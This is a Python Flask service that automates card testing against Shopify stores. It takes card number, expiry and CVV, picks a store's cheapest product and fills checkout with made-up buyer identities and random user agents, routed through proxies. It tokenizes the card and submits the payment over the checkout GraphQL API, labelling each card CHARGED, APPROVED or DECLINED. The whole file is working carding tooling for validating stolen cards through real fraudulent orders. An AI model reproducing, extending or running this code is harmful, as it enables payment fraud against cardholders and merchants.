from flask import Flask, jsonify, request
import asyncio
import httpx
import json
import re
import random
import uuid
import time
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from urllib.parse import urlparse
import urllib3
import sys
import logging
from datetime import datetime

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="ignore")
    sys.stderr.reconfigure(encoding="utf-8", errors="ignore")
except Exception:
    pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
HTTP_TIMEOUT = 30
MAX_RETRIES = 3

# --- UPGRADED BOLD MAP ---
BOLD_MAP = {
    'CHARGED': '𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎',
    'DECLINED': '𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌',
    'APPROVED': ' 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅',
    'ERROR': '❌ 𝗘𝗥𝗥𝗢𝗥',
    'SUCCESS': '✅ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦',
    'CHECK': '🔍 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚',
    'FOUND': '✅ 𝗙𝗢𝗨𝗡𝗗',
    'WARN': '⚠️ 𝗪𝗔𝗥𝗡𝗜𝗡𝗚'
}

# --- STANDARDIZED RESPONSE CODES ---
# Maps raw errors to your specific JSON response values
RESPONSE_MAP = {
    # Success
    'ORDER_CONFIRMED': 'ORDER_CONFIRMED',
    '3DS_REQUIRED': '3DS_REQUIRED',
    
    # Card Declines (Bank/Gateway)
    'insufficient_funds': 'INSUFFICIENT_FUNDS',
    'decline': 'CARD_DECLINED',
    'generic_decline': 'CARD_DECLINED',
    'do_not_honor': 'DO_NOT_HONOR',
    'pickup_card': 'PICKUP_CARD',
    'lost_card': 'PICKUP_CARD',
    'stolen_card': 'PICKUP_CARD',
    'restricted_card': 'RESTRICTED_CARD',
    'card_declined': 'CARD_DECLINED',
    'invalid_number': 'INVALID_NUMBER',
    'incorrect_number': 'INVALID_NUMBER',
    'invalid_expiry': 'EXPIRED_CARD',
    'expired_card': 'EXPIRED_CARD',
    'invalid_cvc': 'INVALID_CVC',
    'incorrect_cvc': 'INVALID_CVC',
    'cvc_check_failed': 'INVALID_CVC',
    'processing_error': 'CARD_DECLINED', # Often a generic bank error
    'transaction_not_allowed': 'RESTRICTED_CARD',

    # Site/System Issues
    'tokenization_failed': 'TOKENIZATION_FAILED',
    'tokenization_error': 'TOKENIZATION_FAILED',
    'no_products': 'NO_PRODUCTS',
    'product_fetch_failed': 'SITE_UNSUPPORTED',
    'cart_failed': 'CART_FAILED',
    'token_extraction_failed': 'TOKEN_EXTRACTION_FAILED',
    'soft_error_max_retries': 'ERROR', # Fallback for system loops
}

def format_proxy(proxy_str):
    """Format proxy string to httpx compatible format"""
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

    if proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return proxy_str

    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        return f"http://{proxy_str}"
    
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    
    if len(parts) == 4 and not parts[0].replace('.', '').isdigit():
        host, port, user, pw = parts
        return f"http://{user}:{pw}@{host}:{port}"
    
    if '@' in proxy_str:
        return f"http://{proxy_str}"
    
    raise ValueError(f"Invalid proxy format: {proxy_str}")

def find_between(s, start, end):
    """Extract string between two delimiters"""
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

def mask_cc(cc_num):
    """Mask credit card number for display"""
    cc_str = str(cc_num).replace(" ", "")
    if len(cc_str) >= 4:
        return f"************{cc_str[-4:]}"
    return "************"

class ShopifyAuto:
    def __init__(self, proxy=None):
        self.user_agent = UserAgent().random
        self.proxy = proxy
        
    def get_headers(self, referer=None, origin=None):
        """Generate headers for requests"""
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': self.user_agent,
        }
        if referer:
            headers['referer'] = referer
        if origin:
            headers['origin'] = origin
        return headers

    async def get_cheapest_product(self, client, site_url):
        """Find the cheapest available product"""
        try:
            url = f"{site_url}/products.json?limit=250"
            response = await client.get(url, headers=self.get_headers())
            
            if response.status_code == 200:
                data = response.json()
                products = data.get('products', [])
                
                valid_products = []
                for product in products:
                    product_title = product.get('title', 'Unknown')
                    variants = product.get('variants', [])
                    
                    for variant in variants:
                        variant_id = variant.get('id')
                        price_str = variant.get('price', '0')
                        available = variant.get('available', False)
                        
                        try:
                            price = float(price_str)
                            if available and price > 0:
                                valid_products.append({
                                    'variant_id': str(variant_id),
                                    'price': price,
                                    'price_str': price_str,
                                    'title': product_title,
                                    'handle': product.get('handle')
                                })
                        except (ValueError, TypeError):
                            continue
                
                if valid_products:
                    valid_products.sort(key=lambda x: x['price'])
                    cheapest = valid_products[0]
                    print(f"   {BOLD_MAP['FOUND']} Cheapest product: {cheapest['title']} - ${cheapest['price_str']}")
                    return cheapest
                    
            return None
            
        except Exception as e:
            print(f"  {BOLD_MAP['ERROR']} Product detection failed: {e}")
            return None

    async def tokenize_card(self, client, cc, mon, year, cvv, first, last, site_url):
        """Tokenize card via multiple endpoints"""
        endpoints = [
            "https://deposit.us.shopifycs.com/sessions",
            "https://checkout.pci.shopifyinc.com/sessions",
            "https://checkout.shopifycs.com/sessions"
        ]
        
        scope_host = urlparse(site_url).netloc
        
        for endpoint in endpoints:
            try:
                payload = {
                    "credit_card": {
                        "number": str(cc).replace(" ", ""),
                        "name": f"{first} {last}",
                        "month": int(mon),
                        "year": int(year),
                        "verification_value": str(cvv)
                    },
                    "payment_session_scope": scope_host
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'Origin': 'https://checkout.shopifycs.com',
                    'User-Agent': self.user_agent
                }
                
                response = await client.post(endpoint, json=payload, headers=headers)
                
                if response.status_code == 200:
                    data = response.json()
                    card_id = data.get('id')
                    if card_id:
                        print(f"   {BOLD_MAP['SUCCESS']} Card tokenized: {card_id[:30]}...")
                        return card_id
                elif response.status_code == 403:
                    print(f"  {BOLD_MAP['WARN']} 403 Forbidden at {endpoint} - proxy may be blocked")
                else:
                    print(f"  {BOLD_MAP['WARN']} {endpoint} returned {response.status_code}")
                    
            except Exception as e:
                print(f"  {BOLD_MAP['WARN']} Tokenization error at {endpoint}: {e}")
                continue
        
        return None

    async def get_random_info(self):
        """Get random user info with valid addresses"""
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"}
        ]
        
        address = random.choice(us_addresses)
        first_names = ["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"]
        
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        
        valid_phones = [
            "2025550199", "3105551234", "4155559876", "6175550123",
            "9718081573", "2125559999", "7735551212", "4085556789"
        ]
        phone = random.choice(valid_phones)
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

async def process_checkout_async(cc, site, proxy_str):
    """Main checkout processing function"""
    start_time = time.time()
    
    # Initialize Default Result Structure
    result = {
        "status": "ERROR",
        "site": "UNKNOWN",
        "amount": "$0.00",
        "response": "UNKNOWN_ERROR",
        "proxy": "NONE",
        "time": "0s",
        "card": cc
    }
    
    # 1. Parse CC
    try:
        parts = cc.split('|')
        if len(parts) < 4:
            result["response"] = "INVALID_FORMAT"
            result["time"] = f"{time.time() - start_time:.2f}s"
            return result
        cc_num, mon, year, cvv = parts[0], parts[1], parts[2], parts[3]
        
        if len(year) == 2:
            year = f"20{year}"
    except Exception:
        result["response"] = "INVALID_FORMAT"
        result["time"] = f"{time.time() - start_time:.2f}s"
        return result
    
    # 2. Format Site
    if not site.startswith(('http://', 'https://')):
        site = f"https://{site}"
    site = site.rstrip('/')
    
    # 3. Format Proxy
    proxy_url = None
    try:
        if proxy_str:
            proxy_url = format_proxy(proxy_str)
            result["proxy"] = "WORKING"
        else:
            result["proxy"] = "NONE"
    except ValueError as e:
        result["response"] = "PROXY_ERROR"
        result["proxy"] = "INVALID_FORMAT"
        result["time"] = f"{time.time() - start_time:.2f}s"
        return result
    
    client_args = {
        'follow_redirects': True,
        'timeout': HTTP_TIMEOUT,
        'verify': False
    }
    
    if proxy_url:
        client_args['proxies'] = proxy_url
    
    shop = ShopifyAuto(proxy=proxy_url)
    
    try:
        async with httpx.AsyncClient(**client_args) as client:
            # STEP 1: Get cheapest product
            print(f"{BOLD_MAP['CHECK']} Finding cheapest product...")
            product = await shop.get_cheapest_product(client, site)
            
            if not product:
                result["response"] = "NO_PRODUCTS"
                result["site"] = "DEAD"
                result["time"] = f"{time.time() - start_time:.2f}s"
                return result
            
            variant_id = product['variant_id']
            price = product['price_str']
            product_handle = product.get('handle')
            
            result["site"] = "ACTIVE"
            result["amount"] = f"${price}"
            
            # STEP 2: Add to cart
            print(f"{BOLD_MAP['CHECK']} Adding to cart...")
            
            if product_handle:
                await client.get(f"{site}/products/{product_handle}", headers=shop.get_headers())
            
            add_data = {
                'id': str(variant_id),
                'quantity': '1',
                'form_type': 'product',
            }
            
            add_response = await client.post(
                f"{site}/cart/add.js", 
                headers=shop.get_headers(referer=f"{site}/cart"),
                data=add_data
            )
            
            if add_response.status_code != 200:
                result["response"] = "CART_FAILED"
                result["time"] = f"{time.time() - start_time:.2f}s"
                return result
            
            print(f"   {BOLD_MAP['SUCCESS']} Item added to cart")
            
            # Get cart token
            cart_response = await client.get(f"{site}/cart.js", headers=shop.get_headers())
            cart_data = cart_response.json()
            token = cart_data.get('token')
            print(f"   {BOLD_MAP['SUCCESS']} Cart token: {token}")
            
            # STEP 3: Go to checkout
            print(f"{BOLD_MAP['CHECK']} Initializing checkout...")
            
            checkout_headers = shop.get_headers(
                referer=f"{site}/cart",
                origin=site
            )
            checkout_headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'upgrade-insecure-requests': '1',
            })
            
            await client.get(f"{site}/checkout", headers=checkout_headers)
            
            checkout_data = {
                'checkout': '',
                'updates[]': '1',
            }
            
            checkout_response = await client.post(
                f"{site}/cart", 
                headers=checkout_headers, 
                data=checkout_data
            )
            
            response_text = checkout_response.text
            
            # Extract tokens
            session_token_match = re.search(
                r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', 
                response_text
            )
            session_token = session_token_match.group(1) if session_token_match else None
            
            queue_token = find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
            stable_id = find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
            payment_method_id = find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            
            if not all([session_token, queue_token, stable_id, payment_method_id]):
                result["response"] = "TOKEN_EXTRACTION_FAILED"
                result["time"] = f"{time.time() - start_time:.2f}s"
                return result
            
            print(f"   {BOLD_MAP['SUCCESS']} Session token extracted")
            
            # STEP 4: Get random user info and tokenize card
            print(f"{BOLD_MAP['CHECK']} Tokenizing card...")
            user_info = await shop.get_random_info()
            
            card_session_id = await shop.tokenize_card(
                client, cc_num, mon, year, cvv,
                user_info['fname'], user_info['lname'],
                site
            )
            
            if not card_session_id:
                result["response"] = "TOKENIZATION_FAILED"
                result["time"] = f"{time.time() - start_time:.2f}s"
                return result
            
            # STEP 5: Submit GraphQL payment
            print(f"{BOLD_MAP['CHECK']} Submitting payment...")
            
            graphql_url = f"{site}/checkouts/unstable/graphql"
            
            retry_count = 0
            max_soft_retries = 3
            soft_error_retried = False
            final_error_code = "UNKNOWN_ERROR"
            
            while retry_count < max_soft_retries:
                retry_count += 1
                print(f"  {BOLD_MAP['CHECK']} Attempt {retry_count}/{max_soft_retries}...")
                
                graphql_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': site,
                    'referer': f"{site}/",
                    'user-agent': shop.user_agent,
                    'x-checkout-one-session-token': session_token,
                    'x-checkout-web-source-id': token,
                }
                
                page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
                
                graphql_payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'checkpointData': None,
                            'sessionInput': {'sessionToken': session_token},
                            'queueToken': queue_token,
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'delivery': {
                                'deliveryLines': [{
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True},
                                        },
                                        'options': {},
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                    'destination': {
                                        'streetAddress': {
                                            'address1': user_info['add1'],
                                            'address2': '',
                                            'city': user_info['city'],
                                            'countryCode': 'US',
                                            'postalCode': str(user_info['zip']),
                                            'company': '',
                                            'firstName': user_info['fname'],
                                            'lastName': user_info['lname'],
                                            'zoneCode': user_info['state_short'],
                                            'phone': user_info['phone'],
                                        },
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': True,
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                            },
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True},
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                }],
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': payment_method_id,
                                            'sessionId': card_session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': user_info['add1'],
                                                    'address2': '',
                                                    'city': user_info['city'],
                                                    'countryCode': 'US',
                                                    'postalCode': str(user_info['zip']),
                                                    'company': '',
                                                    'firstName': user_info['fname'],
                                                    'lastName': user_info['lname'],
                                                    'zoneCode': user_info['state_short'],
                                                    'phone': user_info['phone'],
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                    },
                                    'amount': {'any': True},
                                    'dueAt': None,
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': user_info['add1'],
                                        'address2': '',
                                        'city': user_info['city'],
                                        'countryCode': 'US',
                                        'postalCode': str(user_info['zip']),
                                        'company': '',
                                        'firstName': user_info['fname'],
                                        'lastName': user_info['lname'],
                                        'zoneCode': user_info['state_short'],
                                        'phone': user_info['phone'],
                                    },
                                },
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {
                                    'presentmentCurrency': 'USD',
                                    'countryCode': 'US',
                                },
                                'contactInfoV2': {
                                    'emailOrSms': {
                                        'value': user_info['email'],
                                        'emailOrSmsChanged': False,
                                    },
                                },
                                'marketingConsent': [{'email': {'value': user_info['email']}}],
                                'shopPayOptInPhone': {'countryCode': 'US'},
                            },
                            'tip': {'tipLines': []},
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': [],
                            },
                            'note': {'message': None, 'customAttributes': []},
                            'localizationExtension': {'fields': []},
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None,
                                'signatureUuid': None,
                                'lineItemScriptChanges': [],
                                'paymentScriptChanges': [],
                                'shippingScriptChanges': [],
                            },
                            'optionalDuties': {'buyerRefusesDuties': False},
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'metafields': [],
                        'analytics': {
                            'requestUrl': f'{site}/checkouts/cn/{token}',
                            'pageId': page_id,
                        },
                    },
                    'operationName': 'SubmitForCompletion',
                }
                
                graphql_response = await client.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                
                if graphql_response.status_code == 200:
                    result_data = graphql_response.json()
                    completion = result_data.get('data', {}).get('submitForCompletion', {})
                    
                    receipt_id = None
                    if completion.get('receipt'):
                        receipt_id = completion['receipt'].get('id')
                    
                    errors = completion.get('errors', [])
                    if errors:
                        error_codes = [e.get('code', '').lower() for e in errors if 'code' in e]
                        
                        # Logic to map raw error codes to standardized RESPONSE_MAP
                        mapped_response = None
                        for code in error_codes:
                            if code in RESPONSE_MAP:
                                mapped_response = RESPONSE_MAP[code]
                                break
                        
                        # Soft errors
                        soft_errors = ['tax_new_tax_must_be_accepted', 'waiting_pending_terms']
                        is_soft = any(err in soft_errors for err in error_codes)

                        if is_soft and retry_count < max_soft_retries:
                            print(f"   {BOLD_MAP['WARN']} Soft errors detected: {', '.join(error_codes)}")
                            print(f"   {BOLD_MAP['CHECK']} Retrying ({retry_count}/{max_soft_retries})...")
                            soft_error_retried = True
                            final_error_code = mapped_response if mapped_response else "ERROR"
                            await asyncio.sleep(2)
                            continue
                        else:
                            # Hard decline or final retry attempt
                            result["response"] = mapped_response if mapped_response else "CARD_DECLINED"
                            result["status"] = BOLD_MAP['DECLINED']
                            result["time"] = f"{time.time() - start_time:.2f}s"
                            return result
                    
                    if completion.get('reason'):
                        # Handle general failure reasons
                        reason = completion.get('reason', '').lower()
                        mapped = RESPONSE_MAP.get(reason, "CARD_DECLINED")
                        result["response"] = mapped
                        result["status"] = BOLD_MAP['DECLINED']
                        result["time"] = f"{time.time() - start_time:.2f}s"
                        return result
                    
                    if receipt_id:
                        print("  Polling for receipt status...")
                        
                        poll_payload = {
                            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}',
                            'variables': {
                                'receiptId': receipt_id,
                                'sessionToken': session_token,
                            },
                            'operationName': 'PollForReceipt'
                        }
                        
                        for poll_attempt in range(10):
                            await asyncio.sleep(3)
                            poll_response = await client.post(graphql_url, headers=graphql_headers, json=poll_payload)
                            
                            if poll_response.status_code == 200:
                                poll_data = poll_response.json()
                                receipt = poll_data.get('data', {}).get('receipt', {})
                                typename = receipt.get('__typename')
                                
                                if typename == 'ProcessedReceipt':
                                    result["status"] = BOLD_MAP['CHARGED']
                                    result["response"] = "ORDER_CONFIRMED"
                                    result["time"] = f"{time.time() - start_time:.2f}s"
                                    return result
                                elif typename == 'ActionRequiredReceipt':
                                    result["status"] = BOLD_MAP['APPROVED']
                                    result["response"] = "3DS_REQUIRED"
                                    result["time"] = f"{time.time() - start_time:.2f}s"
                                    return result
                                elif typename == 'FailedReceipt':
                                    error = receipt.get('processingError', {})
                                    code = error.get('code', 'unknown').lower()
                                    
                                    # Map poll error
                                    mapped_response = RESPONSE_MAP.get(code, "CARD_DECLINED")
                                    result["response"] = mapped_response
                                    result["status"] = BOLD_MAP['DECLINED']
                                    result["time"] = f"{time.time() - start_time:.2f}s"
                                    return result
                        
                        result["response"] = "TIMEOUT"
                        result["status"] = BOLD_MAP['ERROR']
                        result["time"] = f"{time.time() - start_time:.2f}s"
                        return result
                    
                    result["status"] = BOLD_MAP['SUCCESS']
                    result["response"] = "ORDER_CONFIRMED"
                    result["time"] = f"{time.time() - start_time:.2f}s"
                    return result
                    
                else:
                    result["response"] = "SITE_BLOCKED"
                    result["status"] = BOLD_MAP['ERROR']
                    result["time"] = f"{time.time() - start_time:.2f}s"
                    return result
            
            if soft_error_retried:
                result["response"] = final_error_code
            else:
                result["response"] = "MAX_RETRIES_EXCEEDED"
            result["status"] = BOLD_MAP['ERROR']
            result["time"] = f"{time.time() - start_time:.2f}s"
            return result
            
    except httpx.ProxyError:
        result["proxy"] = "PROXY_ERROR"
        result["response"] = "PROXY_ERROR"
        result["status"] = BOLD_MAP['ERROR']
        result["time"] = f"{time.time() - start_time:.2f}s"
        return result
    except httpx.ConnectTimeout:
        result["proxy"] = "PROXY_TIMEOUT" if proxy_str else "DEAD"
        result["response"] = "TIMEOUT"
        result["status"] = BOLD_MAP['ERROR']
        result["time"] = f"{time.time() - start_time:.2f}s"
        return result
    except Exception as e:
        result["response"] = "CONNECTION_ERROR"
        result["status"] = BOLD_MAP['ERROR']
        result["time"] = f"{time.time() - start_time:.2f}s"
        return result

@app.route('/hit', methods=['GET'])
def process_api():
    try:
        # Get args
        cc = request.args.get('cc')
        site = request.args.get('site')
        proxy = request.args.get('proxy')
        key = request.args.get('key')
        
        # API key validation
        if not key or key != "nano":
            return jsonify({
                "status": "DECLINED",
                "site": "UNKNOWN",
                "amount": "$0.00",
                "response": "INVALID_KEY",
                "proxy": "UNKNOWN",
                "time": "0s",
                "card": cc if cc else "Unknown"
            })
        
        if not cc or not site:
            return jsonify({
                "status": "DECLINED",
                "site": "UNKNOWN",
                "amount": "$0.00",
                "response": "MISSING_PARAMS",
                "proxy": "UNKNOWN",
                "time": "0s",
                "card": cc if cc else "Unknown"
            })
        
        # Run async process
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(process_checkout_async(cc, site, proxy))
        loop.close()
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "status": "ERROR",
            "proxy": "ERROR",
            "site": "UNKNOWN",
            "amount": "$0.00",
            "response": "SYSTEM_ERROR",
            "time": "0s",
            "card": "Unknown"
        })

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "running"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
